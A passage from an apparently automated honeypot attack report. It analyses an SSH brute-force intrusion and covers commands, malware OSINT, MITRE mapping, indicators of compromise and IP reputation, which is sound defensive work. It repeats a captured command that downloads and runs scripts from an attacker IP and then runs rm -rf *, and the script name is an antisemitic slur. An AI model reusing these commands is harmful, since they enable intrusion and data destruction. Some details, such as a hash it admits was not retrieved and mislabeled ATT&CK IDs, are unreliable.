cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 3:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 4:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 5:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 6:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 7:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

**Input 8:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
````

</details>

---


<details>
<summary>
<h2>Commands Explained</h2>
</summary>

The following `88` commands were executed on the honeypot system:

````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
````
The attacker is trying to **change directory to a writeable folder** where they can execute malicious activities. They try multiple common directories (`/tmp`, `/var/run`, `/mnt`, `/root`, `/`) in case some do not exist or they do not have permissions to access them. The `||` operator is used to try the next command if the previous one fails.
````bash
wget http://213.255.246.81/fuckjewishpeople.sh
chmod 777 fuckjewishpeople.sh
````
The attacker **downloads a malicious shell script** from a remote server using `wget`, makes the script executable with `chmod 777` (setting full permissions for all users), and then executes the script with `sh`. This set of commands is repeated multiple times throughout the honeypot session, indicating the attacker is persistent in trying to run the malicious script.
````bash
tftp 213.255.246.81 -c get tftp1.sh
chmod 777 tftp1.sh
````
The attacker uses `tftp`, a trivial file transfer protocol tool, to **download additional scripts** (`tftp1.sh`) from the same remote server. They then change the permissions to full (with `chmod 777`) and execute them using `sh`. This set of commands is also repeated throughout the session, suggesting they are downloading and executing different stages of the attack or updating their tools.
````bash
tftp -r tftp2.sh -g 213.255.246.81
chmod 777 tftp2.sh
````
Similar to the previous explanation, the attacker is doing the same process with a different file (`tftp2.sh`). This indicates a pattern of behavior, where the attacker consistently downloads and executes scripts that possibly perform various functions for the attacker's goals.
````bash
rm -rf *
````
The attacker uses the `rm -rf *` command to **remove all files and directories** in the current working directory, recursively and without prompting for confirmation. This indicates an attempt to clean up and remove traces of their activities. However, as this command is repeated multiple times through the session without an apparent change of directory, it may not be effective as intended, unless the previous commands consistently fail and the directory remains the same.
</details>

---



# Malware OSINT

### Malware Analysis Summary

#### Malware Information
- **SHA-256**: `aa043d92421ceff25207e931bde07b17494357cc8e1081a006179530b48af950` (The SHA-256 was not retrieved from the `get_malware_attrs` function call, but is inferred from the extracted data.)
- **Source URL**: [http://213.255.246.81/fuckjewishpeople.sh](http://213.255.246.81/fuckjewishpeople.sh)
- **Destination Filename**: Not specified
- **URLs in File**: 1 (Indicating a single URL was used in the malware file, being the source URL from where it was downloaded.)
- **Host IPs in File**: `213.255.246.81` (Suggests this IP is connected to hosting the malware or being used for Command and Control communication.)
- **Size**: Not specified
- **MIME Type**: Not specified

#### Intelligence Source Responses
- **MalwareBazaar**: No information found.
- **ThreatFox**: No information found.
- **URLhaus**: No information found.

#### Exploits and URLs Analysis
The malware involved in the attack was downloaded from `http://213.255.246.81/fuckjewishpeople.sh` by the attacking IP `138.197.148.152`. This downloadable shell script is directly linked to the attacker's actions and was used as part of the malicious activity post-exploitation.

#### Malpedia Inquiry
Further information regarding the specific nature, functionality, or family of the malware is not available through the queried databases, including MalwareBazaar, ThreatFox, and URLhaus. Given the naming of the script, it could contain politically or ideologically motivated payloads, possibly including botnet code, destructive commands, or other forms of malware, and could serve various purposes such as exploitation, proliferation, or coordination of a botnet.

#### Conclusion
Given the lack of specific malware family identification or detailed descriptions from the typical repositories, a deeper investigative analysis of the actual script (e.g., reverse engineering) and the host IP `213.255.246.81` would be required to better understand the underlying purpose and mechanism of the malware used in this attack. Additionally, reaching out to threat intelligence communities or updating these databases with the new findings could aid in tracking this malware or attacker activity in the future.

# Malware Analysis

The malware, in the context of the attack, functions as a means for the attacker to execute a series of unauthorized commands or to deploy additional malicious payloads onto the compromised system. Although the exact content and functionality of the downloaded shell script `fuckjewishpeople.sh` are not explicitly known from the information provided, we can infer its potential roles based on the commands used:

1. **Download and Execution**: The malware is initially downloaded using `wget` from a remote server, which indicates that the attacker has control over the source IP or its content. Once on the compromised machine, the shell script is given executable permissions (`chmod 777`) and is executed (`sh` command).

2. **Payload Delivery**: The role of the malware may be to act as an initial payload that prepares the system for the delivery of additional malware. For example, it could disable security measures, create a backdoor by adding unauthorized SSH keys or user accounts, or modify system configurations to set up persistence.

3. **Further Downloads**: The commands following the execution of the initial script suggest that `fuckjewishpeople.sh` might also contain instructions to download further scripts (`tftp1.sh` and `tftp2.sh`) using `tftp`, which indicates an orchestrated multi-stage attack.

4. **Execution of Secondary Payloads**: Similar to the initial download, the subsequent scripts are given full permissions and executed, which implies a likelihood of different stages or components of the malware being deployed - each possibly with its own attack vector or purpose, such as a rootkit, a ransomware payload, botnet code, or espionage-related tools.

5. **Covering Tracks or Destructive Actions**: The command to remove all files (`rm -rf *`) could serve the dual purpose of removing evidence of the attack, hindering forensic analysis, or destructing data as part of the malicious intent (e.g., sabotage or impact maximization).

In summary, the malware operates as an initial gatecrasher that opens the door for subsequent actions and potentially more sophisticated attack modules. The script’s purpose could range from establishing a foothold for prolonged access to executing a complete attack sequence ending in the destruction of files to conceal the attack activities or intentionally cause harm.

Without the actual script content, further speculation on its detailed functions would not be accurate. It's critical to analyze the script through reverse engineering to understand its definitive behavior, capabilities, and intent within the attack.
This attack downloaded `1` raw malware samples which can be standardized into `1` samples:

### Raw Malware Sample

<details>
<summary>
<h4>Raw Malware Sample 0/1 Sha256 HASH: </h4>
</summary>

**Standardized** Sha256 HASH: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`

**Sample Below** Sha256 HASH: ``
````Shell Script

````

</details>

---


### Commented Malware Sample & Explanation

<details>
<summary>
<h4>
Standardized Malware Sample 0/1 Sha256 HASH: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</h4>
</summary>


````Shell Script

````

</details>

---

The malware in question does not have source code provided; however, based on the commands executed by the attacker as provided in the JSON object, we can infer the following sequence of events and purpose of the malware execution process. It's worth mentioning that the shell script name used in the commands is extremely offensive – this could reflect the intent or ideology of the attacker, but it should be ignored for the technical analysis here.

1. **Changing Working Directory**: `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /` 
The attacker tries to change the working directory to various common directories where they may have write permission or where executables are often stored.

2. **Downloading Malware**: `wget http://213.255.246.81/fuckjewishpeople.sh` 
The attacker downloads a shell script from a remote server controlled by them.

3. **Permission Change**: `chmod 777 fuckjewishpeople.sh` 
This command changes the permissions of the downloaded shell script to be readable, writable, and executable by anyone on the system.

4. **Executing Malware**: `sh fuckjewishpeople.sh` 
The shell script is executed. Without the script's content, we cannot know its exact actions, but it could be for initiating a further payload download, setting up a backdoor, etc.

5-7. **Using TFTP**: 
Commands involving `tftp` suggest that the attacker uses the Trivial File Transfer Protocol to download additional files, likely part of the malware payload.

10. **Deleting Files**: `rm -rf *` 
This command recursively and forcefully removes all files in the current directory, which indicates a potential wiper or sabotage function.

The commands are repeated several times, potentially to ensure execution or to try different directories as initial execution paths. 

It is important to note that repetition of commands with such destructive potential like `rm -rf *` can lead to severe data loss and suggests the attack aims to cause damage rather than to persist unnoticed on the system. The use of both `wget` and `tftp` suggests the attacker is trying multiple methods to transfer files, possibly to deal with different system configurations.

Given the absence of the source code, the analysis is based solely on the commands issued, which strongly indicate that the purpose of the attack was to download and execute a remote shell script to compromise and potentially destroy data on the target system. The malware seems to be designed for Unix-like systems, given the use of shell script execution and Unix commands.

# Which vulnerability does the attack attempt to exploit?
Based on the information provided, the primary vulnerability being exploited appears to be weak or default credentials used on an SSH service (Port 22). The attacker uses the username `root` and password `12345678`, indicating a brute-force attack or exploiting a common weak/default credential.

However, this specific vulnerability does not have a particular CVE number or an exploit name because it's essentially a poor security practice by the server administrator rather than a flaw or bug in the software. Therefore, no ExploitDB code is available for such cases.

A secure configuration such as requiring cryptographic keys for login, setting up two-factor authentication (2FA), or implementing defence-in-depth strategies, such as deploying intrusion detection or prevention systems, rate limiting, and continuously monitoring suspicious activity, are practical ways to harden servers against such common types of attacks.


# MITRE ATT&CK
Based on the provided information about the attack, several techniques from the MITRE ATT&CK framework can be identified:

1. **T1078 - Valid Accounts**: The attacker exploited weak or default SSH credentials (`root`/`12345678`). In this case, the 'valid' account is the root user, which provides the highest privileges on a system.

2. **T1047 - Network Service Scanning**: The attacker must presumably have identified the SSH service (typically running on port 22 or, in this case, possibly an atypical port 2222) as a potential vulnerability for their initial access, indicating some level of service scanning beforehand.

3. **T1110 - Brute Force**: The attacker used brute force to attempt to log in via SSH. The successful use of relatively simple and frequently used credentials suggests a brute-force attack.

4. **T1021 - Remote Services**: The attacker leveraged SSH to carry out the attack, which is a commonly used remote service for managing Unix-based systems.

5. **T1072 - Software Deployment Tools**: After gaining access to the system, the attacker used `wget` and `tftp` - tools typically used for downloading files or software - to download the malicious shell script and subsequently get it executed on the system.

6. **T1059 - Command and Scripting Interpreter**: The attacker executed common Unix/bash scripting commands to carry out their malicious activity, showing the use of scripting in this attack.

7. **T1105 - Ingress Tool Transfer** : The malware `fuckjewishpeople.sh` was transferred into the machine using `wget` from an external server.

8. **T1064 - Scripting**: The attacker downloaded malicious bash scripts and executed them potentially spreading the attack, increasing access, or performing destructive actions.

9. **T1486 - Data Destruction**: The execution of the `rm -rf *` command suggests an intent to remove or destroy data, either to cover tracks or cause harm.

These techniques collectively show that the attacker was able to exploit weak security practices (namely, weak credentials) to gain initial access to the system, then leveraged scripting and built-in tools to download and execute malicious scripts, potentially carrying out destructive actions or propagating the attack.

# What Is The Goal Of The Attack?
Based on the analysis of the attack, the attacker's goals could include the following:

- **System Compromise and Control**: The attacker gained unauthorized access to the system using brute-force methods on open SSH services, which indicates a clear goal of initially breaching and taking control of the system. 

- **Malware Execution and Propagation**: By executing malicious scripts, the attacker likely aimed to deploy further malware payloads that could serve various purposes, such as creating backdoors for persistent access, altering system configurations, or spreading the malware to other connected systems.

- **Data Destruction/Damage**: With the execution of the `rm -rf *` command, there appears to be an intentional effort to delete all files in the given directory. This could be either a form of sabotage or an attempt to wipe out system logs and other evidence of their activities.

- **Botnet Activity**: Considering the wide engagement with numerous vulnerabilities across various systems by the attacker's IP address, as shown in the threat intelligence reports, the attacker could be aiming to build or contribute to a botnet. The infected systems could then be used for distributed denial-of-service attacks (DDoS), crypto mining, or other coordinated attacks.

However, without fully analyzing the content and functionality of the downloaded scripts (`fuckjewishpeople.sh`, `tftp1.sh`, `tftp2.sh`), we cannot definitively determine all the potential goals of the attacker. The scripts could uncover more specific intentions if reverse-engineered and analyzed.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
Given the attacker's strategies and the vulnerabilities exploited in this attack, there is a high likelihood that the attack would be successful if the system is vulnerable. However, the success of the attack entirely hinges on two main factors:

1. **Weak or Default SSH Credentials**: The attacker managed to gain initial access by exploiting weak credentials – username `root` and password `12345678`. If the system's SSH service allows root login or requires weak credentials, the attacker would have successfully breached the system. 

2. **Execution of Downloaded Scripts**: After gaining access, the attacker downloads and executes potentially malicious scripts. If the system does not have controls in place to prevent the execution of unauthorized scripts, the attacker would be able to proceed with their post-exploitation activities, including further system compromise and possible data destruction.

So, the attack's success largely depends on the system's security configuration that allows for these vulnerabilities. Nevertheless, these kinds of attacks can be mitigated by good security practices:
- By securing SSH services with strong and unique user credentials, prohibiting root logins, or implementing keys-based authentication.
- By enforcing robust script and application controls.
- By deploying intrusion detection/prevention systems (IDS/IPS) and securing servers with firewalls.
- By implementing continuous monitoring, diagnostics, and logging.
- By performing regular security audits and patching the system as required. 

In the case that the attack is successful, a compromised system's indicators, such as unusual system performance, the execution of unusual commands, or unexpected data loss, should trigger further security investigation and responses.

# How Can A System Be Protected From This Attack?
Here are several measures that should be taken to protect a server from this kind of attack:

1. **Strong Authentication Measures**: Require strong, unique passwords or consider key-based SSH authentication. Limit the number of unsuccessful login attempts that an IP can make, thus thwarting brute force attacks. If possible, disallow root login and ensure the principle of least privilege is followed.

2. **Use Multi-Factor Authentication (MFA)**: Implementing multi-factor authentication can significantly improve security by requiring users to provide multiple forms of identity verification.

3. **Regular Updates**: Always keep your server's operating system and applications up to date. Regularly update your services, applications, and kernels to patch vulnerabilities.

4. **Security Groups and Firewalls**: Configure your firewall rules to allow SSH connections only from trusted IP addresses. This greatly reduces the exposed surface area to potential attackers.

5. **Intrusion Detection/Prevention**: Tools like Fail2ban, DenyHosts, or Cloudflare's IP firewalls can limit or block repeated failed login attempts, thus protecting against brute-force attacks.

6. **Secure Configuration**: Hardening your server and ensuring proper configuration is key in reducing your server's attack surface. Remove or disable unnecessary services and applications.

7. **Monitor System Logs**: Regularly monitor SSH server logs (`/var/log/secure` or `/var/log/auth.log`). Unusual login patterns or failed access attempts can be a sign of an attempted attack.

8. **Active Threat Intelligence and Updates**: Incorporate threat feeds and IoC databases into your security infrastructure to keep track of new vulnerabilities, threats, and rogue IPs.

9. **Train Your Staff**: Ensure everyone involved with managing the server knows and applies best practices. Security is weakest where users are not aware.

10. **Backup Regularly and Keep Offline Copies**: Regular backups and offline storage can make data recovery much easier in the case of data loss.

By applying these measures, you can significantly thwart and mitigate the risks of attacks like these.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
The indicators of compromise (IOCs) for this attack include:

1. **Source IP of the Attacker**: `138.197.148.152` - This IP address was found to be the source of the malicious SSH login attempts. System logs showing repeated login attempts or traffic from this IP would be a clear sign of potential attack activities.

2. **Brute-force Attempts**: Multiple login attempts using the username `root` and the password `12345678` may indicate brute-force attempts.

3. **Successful Logins**: Successful login messages for the root user, especially from unfamiliar IPs, should be considered suspicious.

4. **Execution of Certain Commands**: The execution of commands related to downloading and the running of malicious scripts are significant IOCs. These activities are red flags for post-exploitation activities:
    - `wget http://213.255.246.81/fuckjewishpeople.sh`
    - `chmod 777 fuckjewishpeople.sh`
    - `sh fuckjewishpeople.sh`
    - `tftp 213.255.246.81 -c get tftp1.sh`
    - `chmod 777 tftp1.sh; sh tftp1.sh`
    - `tftp -r tftp2.sh -g 213.255.246.81`
    - `chmod 777 tftp2.sh; sh tftp2.sh`
    - `rm -rf *`

5. **SSH Logs**: System logs such as `/var/log/secure` or `/var/log/auth.log` will contain entries of login attempts. Successful or failed attempts from the above IP would be a sign of an attempted or successful attack.

6. **Malicious Files**: The presence of any of these files on the server can serve as indicators of compromise:
    - `fuckjewishpeople.sh`
    - `tftp1.sh`
    - `tftp2.sh`

7. **Malware Hash**: The SHA-256 hash of the known malware associated with the attack - `aa043d92421ceff25207e931bde07b17494357cc8e1081a006179530b48af950`.

8. **Network Connections**: Unexpected outbound network connections to the IP address `213.255.246.81`.

9. **Malware Host IP**: The IP address `213.255.246.81` is hosting exploitative scripts. Traffic to this server could indicate malicious activity.

10. **Data Deletion**: An unusual amount of files being removed or an increase in disk space free might indicate the destructive command `rm -rf *` has been run.

These IOCs can provide leads during incident responses, be used for threat hunting purposes, or be used to develop IDS signatures.

# What do you know about the attacker?
### Critical Findings across OSINT Sources for the IP `138.197.148.152`:

#### Geolocation & Hosting:
- The attacker is utilizing a server located in Toronto, Ontario, Canada.
- The hosting provider is DigitalOcean LLC, a well-known cloud service provider.

#### Security & Reputation Risks:
- The IP address has been reported for engaging in malicious activity, including brute force attacks.
- It has been identified as a high-risk entity with a 100% risk score according to AbuseIPDB.
- The IP has been listed on various blocklists, indicating a well-documented history of malicious activities.

#### Behavioral Patterns:
- The IP has targeted multiple honeypots and has been reported on several occasions for suspicious behavior.
- It is associated with attacks using SSH and has been identified scanning the internet for potential targets.

#### Threat Intelligence Reports:
- No data was found on ThreatFox, though other sources have extensively flagged the IP address.
- The IP ties back to the network range `138.197.144.0/20` and has been actively reported on threat feeds like Blocklist.de and CI Army.

#### Malware Analysis:
- The attacker downloaded a shell script named `fuckjewishpeople.sh` from `213.255.246.81`.
- This script likely forms part of an automated attack post successful SSH brute force.
- No specific malware family has been identified from MalwareBazaar, ThreatFox, or URLhaus, suggesting new or unclassified malware.

#### Attack Tactics:
- The attack involved brute force SSH login attempts with username `root` and password `12345678`.
- Multiple sessions were initiated with varying durations, indicative of automated script usage.
- On successful login, commands were executed to download and run malicious scripts, likely to compromise the system further, spread malware, or carry out destructive activities.

#### Additional Context:
- The downloaded bash script and associated IP `213.255.246.81`, and the commands executed thereafter, suggest the intention to deploy potentially destructive or controlling malware onto the compromised systems.

### Conclusion:
The critical findings paint a picture of an attacker or attack group using a server in Canada, employing automated tools and scripts across numerous sessions to compromise systems via SSH brute force attacks. Post-exploitation activities suggest further system compromise, malware deployment, and potentially destructive or botnet-related activities. The lack of malware classification in prominent databases may indicate a new or evolving threat yet to be captured in these repositories.

<details>
<summary>
<h2>IP Locations</h2>
</summary>


### IP Locations Summary
The attacker's IP address `138.197.148.152` is associated with the following location and network details:

- **General Location:** Toronto, Ontario, Canada
- **ISP/Hosting Provider:** DigitalOcean LLC
- **Usage:** Data Center/Web Hosting/Transit
- **Cloud Provider:** DigitalOcean
- **Cloud Region:** Canada, Ontario
- **Organization:** DigitalOcean, LLC
- **Autonomous System Number (ASN):** AS14061
- **Security and Reputation Reports:** 
  - The IP address has been reported as engaging in malicious/attacker activity and abuse/bot activity; it has been identified as a proxy and has been listed on multiple blocklists such as Blocklist.de, CI Army, DataPlane.org, Interserver.net, isx.fr, and Rutgers.
  - AbuseIPDB scored the IP address at a 100% risk level with 330 reports by 78 users, last reported on January 11, 2024.
  - GreyNoise classified the IP as malicious and reported it as scanning the internet in the last 3 months, up to January 10, 2024.
  - Pulsedive marked it with low risk, last seen on January 4, 2024, and found in feed lists including Blocklist.de. The opened service identified was SSH.
  - AlienVault OTX included the IP address in 6 pulse-feed reports.
  - ISC reported a total of 108 reports targeting 12 honeypots, with the first appearance on January 3, 2024, and the last on January 10, 2024. The IP address belongs to the network 138.197.144.0/20.

Additionally, from Shodan's search, it is found that:
- **Ports and Services:**
  - Port 22: Running OpenSSH 7.6p1 Ubuntu-4ubuntu0.5.
  - Port 80: Redirect to HTTPS (`Moved Permanently` response).
  - Port 443: Returned a `Bad Request` response during an HTTP probe.

The information gathered suggests that the IP is known to be a high-risk entity involved in persistent malicious activities and has a history of being reported on various threat intelligence feeds. Given its association with a large cloud service provider like DigitalOcean, it might be that an attacker is utilizing rented infrastructure to conduct their attacks.

* This attack involved `2` unique IP addresses. `1` were source IPs.`1` unique IPs and `1` unique URLS were found in the commands.`0` unique IPs and `0` unique URLS were found in malware.
* The most common **Country** of origin was `Canada`, which was seen `1` times.
* The most common **City** of origin was `Toronto`, which was seen `1` times.
* The most common **ISP** of origin was `DigitalOcean, LLC`, which was seen `1` times.
* The most common **Organization** of origin was `DigitalOcean, LLC`, which was seen `1` times.
* The most common **ASN** of origin was `AS14061`, which was seen `1` times.
* The most common **network** of origin was `138.197.144.0/20`, which was seen `1` times.


| IP Address | Country | City | ISP | Organization | ASN | Network |
| --- | --- | --- | --- | --- | --- | --- |
| 138.197.148.152 | Canada | Toronto | DigitalOcean, LLC | DigitalOcean, LLC | AS14061 | 138.197.144.0/20 |
| 213.255.246.81 | United Kingdom | London | Clouvider | CLOUVIDER Virtual Machines | AS62240 | 213.255.246.0/24 |

</details>

---


<details>
<summary>
<h2>CyberGordon</h2>
</summary>


### CyberGordon Results Summary
Based on CyberGordon data, the following information is known about the IP address `138.197.148.152` involved in the attack:

- **Geolocation**: The IP is geographically located in Toronto, Ontario, Canada.
- **Network**: It is part of AS14061, DigitalOcean LLC, which is known for hosting services.
- **Security Risks**:
  - The IP has been reported to be involved in malicious and attacker activities.
  - It exhibits signs of abuse and bot activity and has been identified as a proxy.

- **Blocklists**: The IP has been listed on several blocklists, which reflect its association with malicious activity:
  - Blocklist.de
  - CI Army
  - DataPlane.org
  - Interserver.net
  - isx.fr
  - Rutgers

- **Reports from various entities**: 
  - **AbuseIPDB**: Pointed out the IP is used for data center/web hosting/transit purposes and has a risk score of 100%.
  - **GreyNoise**: Last reported the IP as malicious and engaged in internet scanning.
  - **Pulsedive**: Assigned a low-risk label and saw the IP appear in blocklist feeds, confirming it as an SSH-opened service.
  - **AlienVault OTX**: Included the IP in multiple pulse-feed reports.
  - **BlackList DE**: Connected the IP to several attacks and reports.

The CyberGordon data indicates that the IP address `138.197.148.152` is widely recognized across various security platforms for its association with malicious activities, supporting the notion that the IP is a high-risk entity involved in persistent attacks, particularly against SSH services.

* `20` total alerts were found across all engines.
* `7` were **high** priority. 
* `8` were **medium** priority. 
* `5` were **low** priority. 
* The IP address with the **most high priority alerts** was `213.255.246.81` with `4` alerts.


| IP Addresss | Alerts High \| Med \| Low | [E1] IPinfo | [E2] AbuseIPDB | [E4] urlscan.io | [E7] Google DNS | [E11] DShield/ISC | [E12] AlienVault OTX | [E17] Pulsedive | [E23] Offline Feeds | [E24] BlackList DE | [E26] MetaDefender | [E33] GreyNoise | [E34] IPdata.co |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 213.255.246.81 | `4` \| `5` \| `3` | <details>`Geo: London, England, GB. Network: AS62240 Clouvider. `<summary>`low`</summary></details> | <details>` ISP: Clouvider Limited. Usage: Data Center/Web Hosting/Transit. Risk 100%. 172 report(s) by 100 user(s), last on 23 January 2024  `<summary>`high`</summary></details> | <details>`Found in 2 scan(s). Top 5 domains: 213.255.246.81 (2) `<summary>`low`</summary></details> | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 126 report(s) listing 24 target(s), last on 22 Jan 2024 `<summary>`high`</summary></details> | <details>`Found in 4 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: unknown. Last seen on 21 Jan 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts. `<summary>`medium`</summary></details> | <details>`Found in FireHOL Level 3 (last 30 days), IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners `<summary>`medium`</summary></details> | <details>`Found in 10 attack(s) and 2 report(s) `<summary>`medium`</summary></details> | <details>`Found in 2 sources: webroot.com (high risk), avira.com (Malware) `<summary>`medium`</summary></details> | <details>`Last report on 23 January 2024 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: London, England, United Kingdom. Network: AS62240, Clouvider Limited, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch. `<summary>`high`</summary></details> |
| 138.197.148.152 | `3` \| `3` \| `2` | <details>`Geo: Toronto, Ontario, CA. Network: AS14061 DigitalOcean, LLC. Hostname: htb-jsjmxdmsvf.htb-cloud.com. `<summary>`low`</summary></details> | <details>` ISP: DigitalOcean LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 330 report(s) by 78 user(s), last on 11 January 2024  `<summary>`high`</summary></details> | None | <details>`No DNS PTR record found `<summary>`low`</summary></details> | None | <details>`Found in 6 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: low. Last seen on 4 Jan 2024. Found in feed list(s): Blocklist.de Blocklist. Opened service(s): SSH. `<summary>`medium`</summary></details> | None | <details>`Found in 17 attack(s) and 5 report(s) `<summary>`medium`</summary></details> | None | <details>`Last report on 10 January 2024 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Toronto, Ontario, Canada. Network: AS14061, Digitalocean LLC, hosting. Security risk(s): malicious/attacker activity, abuse/bot activity, proxy. Blocklist(s): Blocklist.de, CI Army, DataPlane.org, Interserver.net, isx.fr, Rutgers. `<summary>`high`</summary></details> |

### CyberGordon Results

<details>
<summary>
<h3>Cybergordon results for: 138.197.148.152</h3>
</summary>


### Cybergordon results for: 138.197.148.152 [https://cybergordon.com/r/a737b4d9-41cf-408a-9698-040c5256a019](https://cybergordon.com/r/a737b4d9-41cf-408a-9698-040c5256a019)

| Engine | Results | Url |
| --- | --- | --- |
| [E34] IPdata.co | Geo: Toronto, Ontario, Canada. Network: AS14061, Digitalocean LLC, hosting. Security risk(s): malicious/attacker activity, abuse/bot activity, proxy. Blocklist(s): Blocklist.de, CI Army, DataPlane.org, Interserver.net, isx.fr, Rutgers.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: DigitalOcean LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 330 report(s) by 78 user(s), last on 11 January 2024   | https://www.abuseipdb.com/check/138.197.148.152 |
| [E33] GreyNoise | Last report on 10 January 2024 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/138.197.148.152 |
| [E17] Pulsedive | Risk: low. Last seen on 4 Jan 2024. Found in feed list(s): Blocklist.de Blocklist. Opened service(s): SSH.  | https://pulsedive.com/browse |
| [E12] AlienVault OTX | Found in 6 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/138.197.148.152 |
| [E24] BlackList DE | Found in 17 attack(s) and 5 report(s)  | https://www.blocklist.de/en/search.html?ip=138.197.148.152 |
| [E1] IPinfo | Geo: Toronto, Ontario, CA. Network: AS14061 DigitalOcean, LLC. Hostname: htb-jsjmxdmsvf.htb-cloud.com.  | https://ipinfo.io/138.197.148.152 |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=152.148.197.138.in-addr.arpa&type=PTR |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 213.255.246.81</h3>
</summary>


### Cybergordon results for: 213.255.246.81 [https://cybergordon.com/r/e6ec08bc-6eeb-4dc6-b759-d2e054d79546](https://cybergordon.com/r/e6ec08bc-6eeb-4dc6-b759-d2e054d79546)

| Engine | Results | Url |
| --- | --- | --- |
| [E33] GreyNoise | Last report on 23 January 2024 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/213.255.246.81 |
| [E34] IPdata.co | Geo: London, England, United Kingdom. Network: AS62240, Clouvider Limited, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: Clouvider Limited. Usage: Data Center/Web Hosting/Transit. Risk 100%. 172 report(s) by 100 user(s), last on 23 January 2024   | https://www.abuseipdb.com/check/213.255.246.81 |
| [E11] DShield/ISC | Found in 126 report(s) listing 24 target(s), last on 22 Jan 2024  | https://isc.sans.edu/ipinfo.html?ip=213.255.246.81 |
| [E26] MetaDefender | Found in 2 sources: webroot.com (high risk), avira.com (Malware)  | https://metadefender.opswat.com |
| [E17] Pulsedive | Risk: unknown. Last seen on 21 Jan 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts.  | https://pulsedive.com/browse |
| [E24] BlackList DE | Found in 10 attack(s) and 2 report(s)  | https://www.blocklist.de/en/search.html?ip=213.255.246.81 |
| [E12] AlienVault OTX | Found in 4 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/213.255.246.81 |
| [E23] Offline Feeds | Found in FireHOL Level 3 (last 30 days), IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners  | / |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=81.246.255.213.in-addr.arpa&type=PTR |
| [E1] IPinfo | Geo: London, England, GB. Network: AS62240 Clouvider.  | https://ipinfo.io/213.255.246.81 |
| [E4] urlscan.io | Found in 2 scan(s). Top 5 domains: 213.255.246.81 (2)  | https://urlscan.io/search/#ip%3A%22213.255.246.81%22 |

</details>

---


</details>

---


<details>
<summary>
<h2>Shodan</h2>
</summary>


### Shodan Results Summary
Using Shodan, the following information has been gathered about the IP address `138.197.148.152` involved in the attack:

- **Cloud Provider**: DigitalOcean
- **Cloud Region**: Canada, Ontario (ca-on)
